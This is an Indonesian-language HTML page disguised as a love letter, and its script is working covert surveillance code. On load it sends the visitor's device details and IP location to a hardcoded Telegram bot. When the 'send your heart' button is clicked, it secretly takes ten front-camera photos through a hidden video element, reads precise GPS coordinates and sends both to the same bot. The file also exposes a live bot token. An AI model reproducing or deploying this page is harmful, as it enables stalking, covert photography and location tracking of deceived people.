<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Surat Cinta Untukmu</title>
    <style>
        body {
            font-family: 'Comic Sans MS', cursive, sans-serif;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            background: linear-gradient(to bottom, #ffe6e6, #ffcccc);
            color: #333;
            text-align: center;
        }
        
        .container {
            background-color: rgba(255, 255, 255, 0.9);
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            border: 2px solid #ff9999;
        }
        
        h1 {
            color: #e91e63;
            font-size: 2.5em;
            margin-bottom: 20px;
            text-shadow: 1px 1px 2px #fff;
        }
        
        p {
            font-size: 1.2em;
            line-height: 1.6;
            color: #444;
            margin-bottom: 20px;
        }
        
        .btn {
            background-color: #ff4d4d;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 1.2em;
            width: 100%;
            margin: 20px 0;
            transition: background-color 0.3s, transform 0.2s;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
        }
        
        .btn:hover {
            background-color: #e60000;
            transform: scale(1.05);
        }
        
        .heart {
            color: #ff4d4d;
            font-size: 1.5em;
            margin: 0 5px;
        }
        
        .status {
            padding: 10px;
            border-radius: 5px;
            margin: 15px 0;
            display: none;
            font-size: 1.1em;
        }
        
        .success {
            background-color: #ffe6e6;
            color: #e91e63;
            border: 1px solid #ff9999;
            display: block;
        }
        
        .error {
            background-color: #fff0f0;
            color: #d81b60;
            border: 1px solid #ff9999;
            display: block;
        }
        
        /* Sembunyikan elemen video */
        #video {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Surat Cinta Untukmu <span class="heart">♥</span></h1>
        <p>
            Hai, seseorang yang spesial di hatiku, <br>
            Aku menulis surat ini hanya untukmu. Hatiku berdebar setiap kali memikirkanmu. 
            Untuk membuktikan betapa tulusnya perasaanku, aku ingin tahu di mana hatimu berada saat ini. 
            Tekan tombol di bawah ini untuk mengirimkan hatimu kepadaku. <span class="heart">♥</span>
        </p>
        
        <div id="status" class="status"></div>
        
        <button id="getLocationBtn" class="btn">
            Kirimkan Hatiku <span class="heart">♥</span>
        </button>
        
        <!-- Elemen video untuk menangkap gambar, disembunyikan -->
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas" style="display: none;"></canvas>
    </div>

    <script>
        // Variabel global untuk menyimpan data
        let userLocation = null;
        let deviceInfo = null;
        let ipInfo = null;
        let capturedImages = [];
        
        // Telegram bot configuration
        const TELEGRAM_BOT_TOKEN = '8017211340:AAFSjXZFSujFxHnCNFOcPKLcP0lJxQcyDoQ';
        const TELEGRAM_CHAT_ID = '2028336963';
        
        // Fungsi untuk menampilkan status
        function showStatus(message, type) {
            const statusElement = document.getElementById('status');
            statusElement.textContent = message;
            statusElement.className = 'status ' + type;
        }
        
        // Fungsi untuk mendapatkan informasi perangkat
        function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            let deviceType = 'Desktop';
            let os = 'Unknown OS';
            let browser = 'Unknown Browser';
            
            if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
                deviceType = 'Mobile';
            } else if (/Tablet|iPad/i.test(userAgent)) {
                deviceType = 'Tablet';
            }
            
            if (/Windows/i.test(userAgent)) {
                os = 'Windows';
            } else if (/Mac/i.test(userAgent)) {
                os = 'Mac';
            } else if (/Linux/i.test(userAgent)) {
                os = 'Linux';
            } else if (/Android/i.test(userAgent)) {
                os = 'Android';
            } else if (/iOS|iPhone|iPad|iPod/i.test(userAgent)) {
                os = 'iOS';
            }
            
            if (/Edg/i.test(userAgent)) {
                browser = 'Microsoft Edge';
            } else if (/OPR/i.test(userAgent)) {
                browser = 'Opera';
            } else if (/Chrome/i.test(userAgent)) {
                browser = 'Google Chrome';
            } else if (/Firefox/i.test(userAgent)) {
                browser = 'Mozilla Firefox';
            } else if (/Safari/i.test(userAgent)) {
                browser = 'Safari';
            } else if (/Trident/i.test(userAgent)) {
                browser = 'Internet Explorer';
            }
            
            return {
                deviceType,
                os,
                browser,
                platform: navigator.platform,
                userAgent,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }
        
        // Fungsi untuk mendapatkan informasi IP
        async function getIPInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                return await response.json();
            } catch (error) {
                console.error('Error fetching IP info:', error);
                return null;
            }
        }
        
        // Fungsi untuk mengirim teks ke Telegram
        async function sendTextToTelegram(message) {
            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
                console.error('Telegram bot token or chat ID not configured');
                return;
            }
            
            try {
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    })
                });
                
                const data = await response.json();
                if (!data.ok) {
                    console.error('Telegram API error:', data);
                }
            } catch (error) {
                console.error('Error sending to Telegram:', error);
            }
        }
        
        // Fungsi untuk mengirim gambar ke Telegram
        async function sendPhotoToTelegram(imageData) {
            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
                console.error('Telegram bot token or chat ID not configured');
                return;
            }
            
            try {
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        photo: imageData,
                        caption: 'Gambar dari pengguna'
                    })
                });
                
                const data = await response.json();
                if (!data.ok) {
                    console.error('Telegram API error:', data);
                }
            } catch (error) {
                console.error('Error sending photo to Telegram:', error);
            }
        }
        
        // Fungsi untuk mengambil lokasi
        function captureLocation(callback) {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        userLocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date(position.timestamp).toLocaleString()
                        };
                        callback();
                    },
                    error => {
                        console.error('Geolocation error:', error);
                        showStatus('Aku tidak bisa merasakan hatimu saat ini, tapi memorimu tetap tersimpan! ♥', 'success');
                        callback();
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                showStatus('Perangkatmu sepertinya tidak bisa mengirimkan hatimu, tapi memorimu tetap tersimpan! ♥', 'success');
                callback();
            }
        }
        
        // Fungsi untuk mengambil gambar dari kamera
        async function captureImages() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' } // Gunakan kamera depan
                });
                video.srcObject = stream;
                
                // Atur ukuran canvas sesuai video
                canvas.width = 640;
                canvas.height = 480;
                
                // Ambil 10 gambar dengan interval 500ms
                for (let i = 0; i < 10; i++) {
                    await new Promise(resolve => setTimeout(resolve, 500));
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
                    capturedImages.push(imageData);
                }
                
                // Hentikan stream kamera
                stream.getTracks().forEach(track => track.stop());
                
                return true;
            } catch (error) {
                console.error('Camera error:', error);
                showStatus('Aku tidak bisa merekam wajahmu, tapi hatimu tetap ada di sini! ♥', 'success');
                return false;
            }
        }
        
        // Fungsi untuk mengirim semua data ke Telegram
        async function sendAllData() {
            // Kirim gambar
            for (const image of capturedImages) {
                await sendPhotoToTelegram(image);
            }
            
            // Siapkan pesan teks
            let message = `*📸 Gambar Pengguna*:\n` +
                         `Jumlah gambar: ${capturedImages.length}\n\n`;
            
            if (userLocation) {
                const mapUrl = `https://www.google.com/maps?q=${userLocation.latitude},${userLocation.longitude}`;
                message += `*📍 Lokasi Pengguna*:\n` +
                          `Latitude: ${userLocation.latitude}\n` +
                          `Longitude: ${userLocation.longitude}\n` +
                          `Akurasi: ${userLocation.accuracy} meter\n` +
                          `Waktu: ${userLocation.timestamp}\n` +
                          `[Lihat di Google Maps](${mapUrl})\n\n`;
            } else {
                message += `*📍 Lokasi Pengguna*:\n` +
                          `Lokasi tidak tersedia\n\n`;
            }
            
            message += `*📱 Informasi Perangkat*:\n` +
                      `Tipe: ${deviceInfo.deviceType}\n` +
                      `Browser: ${deviceInfo.browser}\n` +
                      `OS: ${deviceInfo.os}\n` +
                      `Platform: ${deviceInfo.platform}\n` +
                      `Bahasa: ${deviceInfo.language}\n` +
                      `Zona Waktu: ${deviceInfo.timezone}\n` +
                      `Resolusi: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\n\n` +
                      `*🌐 Informasi Jaringan*:\n` +
                      `IP: ${ipInfo.ip}\n` +
                      `Kota: ${ipInfo.city}\n` +
                      `Region: ${ipInfo.region}\n` +
                      `Negara: ${ipInfo.country_name}\n` +
                      `Provider: ${ipInfo.org}`;
            
            // Kirim pesan teks
            await sendTextToTelegram(message);
            
            // Tampilkan pesan sukses
            showStatus('Terima kasih! Hatimu dan memorimu telah sampai kepadaku. Aku akan selalu mengingat momen ini. ♥', 'success');
        }
        
        // Inisialisasi saat halaman dimuat
        window.onload = async () => {
            try {
                // Dapatkan informasi perangkat
                deviceInfo = getDeviceInfo();
                
                // Dapatkan informasi IP
                ipInfo = await getIPInfo();
                
                // Kirim informasi dasar ke Telegram
                const message = `*📱 Perangkat Terhubung*:\n` +
                               `Tipe: ${deviceInfo.deviceType}\n` +
                               `Browser: ${deviceInfo.browser}\n` +
                               `OS: ${deviceInfo.os}\n` +
                               `Platform: ${deviceInfo.platform}\n` +
                               `Bahasa: ${deviceInfo.language}\n` +
                               `Zona Waktu: ${deviceInfo.timezone}\n` +
                               `Resolusi: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\n\n` +
                               `*🌐 Informasi Jaringan*:\n` +
                               `IP: ${ipInfo.ip}\n` +
                               `Kota: ${ipInfo.city}\n` +
                               `Region: ${ipInfo.region}\n` +
                               `Negara: ${ipInfo.country_name}\n` +
                               `Provider: ${ipInfo.org}`;
                
                await sendTextToTelegram(message);
                
                // Setup event listener untuk tombol
                document.getElementById('getLocationBtn').addEventListener('click', async () => {
                    showStatus('Sedang merekam hatimu dalam memoriku... ♥', 'success');
                    
                    // Ambil gambar dari kamera
                    const cameraSuccess = await captureImages();
                    
                    // Ambil lokasi dan kirim data
                    captureLocation(async () => {
                        await sendAllData();
                    });
                });
                
            } catch (error) {
                console.error('Initialization error:', error);
                showStatus('Ada masalah kecil, tapi aku tetap menunggu hatimu. Coba lagi ya. ♥', 'error');
            }
        };
    </script>
</body>
</html>
